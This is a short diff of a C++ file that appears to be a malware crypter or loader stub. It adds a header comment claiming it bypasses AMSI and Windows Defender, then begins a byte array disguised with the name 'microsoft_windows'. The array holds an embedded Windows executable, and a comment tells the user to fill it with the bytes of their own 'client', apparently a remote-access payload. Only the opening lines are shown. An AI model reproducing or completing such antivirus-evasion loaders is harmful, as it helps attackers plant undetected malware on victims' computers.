@@ -1,4 +1,4 @@
-#include "stdafx.h"
+#include "stdafx.h" // Created By etormadiv Edited By Bashar Bachir => Bypass AMSI Windows Defender
 unsigned char microsoft_windows[16896] = { // Length Of Your Client + It's Bytes => Use HxD Software
 	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
 	
